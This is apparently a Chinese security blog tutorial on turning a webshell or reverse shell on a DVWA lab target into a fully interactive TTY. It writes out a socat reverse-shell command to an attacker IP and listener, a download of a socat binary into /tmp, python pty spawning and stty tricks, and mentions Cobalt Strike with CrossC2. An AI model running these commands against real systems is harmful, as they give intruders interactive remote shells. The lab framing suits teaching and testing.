0x01 获取完美shell
==============

> 我们正常在使用webshell或反弹的shell的时候，多多少少会遇到如下问题：

1. 一些命令受限
2. 非交互式
3. ctrl+c会直接断开连接
4. 无命令补全
5. 会出现乱码情况

> 这些问题导致我们执行命令的时候很不方便，而且会导致一些如提权类的操作失败，所以我们需要一个完美的终端（TTY）

下面我将边演示边来介绍几种提升shell的方法，我这里面用的Linux虚拟机搭的DVWA靶场上传文件（吐槽一下，在windows上用小皮面板搭建一点问题没有，在Linux上可能因为权限的问题，文件上传那块正常的图片就死活传不上去，后来自己一顿调，本来都想放弃了，结果瞎调调好了）

- - - - - -

1.1 反弹shell
-----------

首先我这里用哥斯拉打开命令界面

![image-20220526195813130](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9f463fde7668561b07eaf3fcbc6a5691e7240bc8.png)

这时候可以通过方向上键回历史记录，但是一些需要交互的命令，如su或者vim都会执行失败，那么我们首先想到的肯定是反弹shell（反弹shell的命令大全，我公众号之前发过篇文章）

![image-20220526200116465](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-0a9af10c8f0cb1304dbeef2c6adff691bde22d23.png)

如下图，通过bash tcp的方式弹了一个很正经的shell

![image-20220526200815665](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-7c0260e26e7ad69e847427ac51eef9ec164413f7.png)

但是这时候，上键历史命令用不了了，不过一些交互有了点效果，如su和vim，但是我进到vim按ctrl+c会直接断开连接

![image-20220526201218045](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1665cbd2ad11d401f3c20c6cf7dea6da0cc624f8.png)

但有的时候，我们可能因为权限等问题不能用su，而su对我们来讲又是非常重要的，所以接下来我们可以对其进行一个升级

1.2 python pty 方式
-----------------

这种方式有个前提是对方机器上必须有python，我这里通过rpm查询对方主机是否存在python

![image-20220526202304234](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3e8bbd2e13c7fa09f0f52fa4a9e7cc737ab605e7.png)

既然存在那就在最基础的反弹shell后，执行下边的命令

pty是python中的一个虚拟终端库
===================

spawn函数：创建一个进程并将其控制终端与当前进程的标准io连接
=================================

python -c 'import pty; pty.spawn("/bin/bash")'

然后通常情况下如果原本不能执行su的话，现在就可以执行了，不过这种方式几乎还是没啥提升，所以我们继续

- - - - - -

1.3 socat
---------

> socat像netcat一样，我们可以用socat建立完整的TTY，但弊端就是需要在对方的主机上建立socat，说人话就是你得在对方机器安装或下载点东西，当然攻击机也需要安装

- kali

安装（因为我用的kali，所以就不用安了，它自带的）
==========================

sudo apt install socat

监听端口
====

socat file:`tty`,raw,echo\\=0 tcp-listen:4444

- 目标主机

从github上下载脚本（省的安装了）到/tmp目录下
===========================

当然可能碰到无法访问github的情况，那就本机下载然后传上去
===============================

wget [https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\\\_64/socat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86%5C_64/socat) -O /tmp/socat  
​

给权限
===

chmod 755 /tmp/socat  
​

反弹
==

/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.113:4444

可以看到连vim都可执行了，而且按ctrl+c不会直接断开了，但实际上还是不算非常完美，偶尔也会出现卡死的情况

![image-20220527122019727](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-7dde216b1ac8f7ee69cd62adff09893c311c0985.png)

要注意这里断开连接，就不能采用ctrl+c了，而是需要exit

![image-20220527122216362](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-219a575695ea07923b355bed894a1071225eddb2.png)

- - - - - -

1.4 花式操作--升级netcat
------------------

- 攻击机

\# 检查当前终端和STTY信息  
echo $TERM  
stty -a

结果如下

![image-20220527140414326](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-192a409a63f4c556eb451e25544a251e3aacf669.png)

- 接收shell

在接收到shell并启动下方的python交互式命令后
===========================

python -c 'import pty; pty.spawn("/bin/bash")'  
​

挂到后台
====

ctrl + z  
​

查看下后台是否存在
=========

jobs -l

成功挂到后台

![image-20220527125548804](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d2494308156f8fcdb73e633c0d6426216596d56e.png)

然后重置stty

stty raw -echo

重置后长这样

![image-20220527134700013](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-eae46c42439ba5181524ee3054b62caabd626fb1.png)

然后输入fg，将后台的任务还原，然后reset刷新终端屏幕，如图我这里出了点问题，当我输入回车的时候变成了`^M`又是一些奇怪的编码问题

将后台挂起的任务还原到前台
=============

fg

执行出错

于是我弹shell到阿里云上，然后重复上面的步骤，当我执行到重置stty的时候，它会像卡了一样，但其实不是它卡了，而是我们重置的原因我们看不到输入的内容，但是实际上还是在输入（这就像你输入密码的时候一样），输入fg回车

![image-20220527143449184](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9af03e7945c43ca5e2a8fdc806ffa997724d0c7b.png)

紧接着执行刷新一下屏幕，看着更和谐

reset

它会询问你终端类型，根据第一步的信息来输入

![image-20220527143620481](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-5781f9b13043ff32c6103f38373cc6d10f5cd81e.png)

回车之后

![image-20220527143631433](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-dab5228885c0b92c6317f9754d6bb1eec2977848.png)

然后其实到这里几乎就可以了，但是还存在一个问题，就是显示问题了

接下来设置环境变量

export SHELL=bash

根据最开始查出来的环境变量来设置
================

export TERM=xterm  
stty rows 行数 columns 列数

ok，一个完美的shell就来了

- - - - - -

1.5 上线到CS
---------

> 正常CS是不能上线Linux主机的，但是通过CrossC2插件可以（这货坑太多了，浪费我好久时间），这里具体操作我就不多说了，看我公众号的另一篇文章

- - - - - -